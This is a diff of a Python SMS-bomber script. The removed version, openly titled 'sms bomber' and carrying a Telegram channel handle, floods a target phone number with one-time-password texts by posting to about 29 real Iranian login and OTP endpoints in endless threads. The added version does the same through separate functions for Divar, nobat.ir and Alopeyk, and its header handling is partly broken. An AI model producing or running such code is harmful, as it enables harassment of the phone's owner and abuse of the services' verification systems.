@@ -1,79 +1,67 @@
 import requests
-import os
-import threading
+import json
+import random
+import string
 import time
 
-red='\033[31m'
-green='\033[32m'
+def CURL_SMS(URL, PHONE_VALUE, HEADER1=None, HEADER2=None):
+    response = None
+    headers = {}
+    if HEADER1:
+        if HEADER2:
+            headers = {HEADER1: HEADER2}
+        else:
+            headers = {HEADER1}
+    try:
+        response = requests.post(URL, data=PHONE_VALUE, headers=headers)
+        response.raise_for_status()
+        with open('log.txt', 'a') as log_file:
+            log_file.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]--URL={URL}{response.text}\n\n')
+        time.sleep(2)
+    except Exception as e:
+        print(f"Error occurred: {e}")
 
-# تعریف URL‌ها
-urls = [
-    "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
-    "https://api.divar.ir/v5/auth/authenticate",
-    "https://nobat.ir/api/public/patient/login/phone",
-    "https://api.alopeyk.com/api/v2/login?platform=pwa",
-    "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
-    "https://shahrfarsh.com/Account/Login",
-    "https://www.digistyle.com/users/login-register/",
-    "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
-    "https://api.digikalajet.ir/user/login-register/",
-    "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
-    "https://api.ostadkr.com/login",
-    "https://www.miare.ir/api/otp/driver/request/",
-    "https://api.tapsi.ir/api/v2.2/user",
-    "https://mobapi.banimode.com/api/v2/auth/request",
-    "https://drdr.ir/api/v3/auth/login/mobile/init",
-    "https://gw.taaghche.com/v4/site/auth/login",
-    "https://gw.taaghche.com/v4/site/auth/signup",
-    "https://api.komodaa.com/api/v2.6/loginRC/request",
-    "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
-    "https://uiapi2.saapa.ir/api/otp/sendCode",
-    "https://api.vandar.io/account/v1/check/mobile",
-    "https://api.mobit.ir/api/web/v8/register/register",
-    "https://taraazws.jabama.com/api/v4/account/send-code",
-    "https://api.pinorest.com/frontend/auth/login/mobile",
-    "https://service.tetherland.com/api/v5/login-register",
-    "https://ws.alibaba.ir/api/v3/account/mobile/otp",
-    "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
-    "https://student.classino.com/otp/v1/api/logi",
-    "https://takshopaccessorise.ir/api/v1/sessions/login_request"
-]
+def divar(phone):
+    url = 'https://api.divar.ir/v5/auth/authenticate'
+    phone_value = json.dumps({"phone": phone})
+    CURL_SMS(url, phone_value)
 
-# تعیین تنظیمات پیکربندی
-phone_number = input("Enter phone Number (9++++++) : ")
-num_threads = 5  # تعداد نخ‌ها
-interval = 1  # زمان انتظار بین هر ارسال (ثانیه)
+def nobatir(phone):
+    url = 'https://nobat.ir/api/public/patient/login/phone'
+    phone_value = {"mobile": phone}
+    headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
+    CURL_SMS(url, phone_value, headers)
 
-# تابع برای ارسال درخواست به URL
-def send_request(url):
-    while True:
-        try:
-            response = requests.post(url, data={"cellphone": "+98" + phone_number})
-            print(f"Sent to {url}, status code: {response.status_code}")
-        except Exception as e:
-            print(f"Error sending to {url}: {e}")
+def alopeyk_login(phone):
+    phone = int(phone)
+    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
+    phone_value = {
+        "type": "CUSTOMER",
+        "model": "Chrome 111.0.0.0",
+        "platform": "pwa",
+        "version": "10",
+        "manufacturer": "Windows",
+        "isVirtual": False,
+        "serial": True,
+        "app_version": "1.2.9",
+        "uuid": True,
+        "phone": phone
+    }
+    headers = {'content-type': 'application/json'}
+    CURL_SMS(url, json.dumps(phone_value), headers)
 
-# پاک کردن صفحه کنسول
-os.system("clear")
-# چاپ عنوان با رنگ قرمز
-print(f"{red} ")
-os.system("figlet sms bomber")
-print(f"{green}===========================================")
-print("  telegram channel: @VPN_Alexabot            ")
-print(f"{green}===========================================")
+# Define other functions for each service in a similar manner
 
-# ایجاد و شروع نخ‌ها
-threads = []
-for i in range(num_threads):
-    for url in urls:
-        t = threading.Thread(target=send_request, args=(url,))
-        t.start()
-        threads.append(t)
-    time.sleep(interval)  # انتظار برای فراخوانی بعدی
+def generate_random_string(length=10):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
-# انتظار برای پایان همه نخ‌ها
-for t in threads:
-    t.join()
+def main(phone):
+    divar(phone)
+    nobatir(phone)
+    alopeyk_login(phone)
+    # Call other functions here for other services
 
-# اتمام برنامه
-print("Done!")
+if __name__ == "__main__":
+    phone_number = input("Enter your phone number: ")
+    main(phone_number)
